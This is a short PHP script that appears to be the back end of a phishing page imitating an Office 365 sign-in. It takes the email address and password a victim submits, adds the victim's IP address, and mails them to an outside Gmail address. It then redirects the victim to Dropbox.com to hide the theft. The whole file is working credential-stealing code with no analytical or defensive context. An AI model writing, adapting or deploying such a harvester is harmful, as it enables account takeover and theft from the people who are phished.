<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || 365 tare || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="annyoordaz@gmail.com";
$subject = "tare_ama 365  | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://Dropbox.com");
?>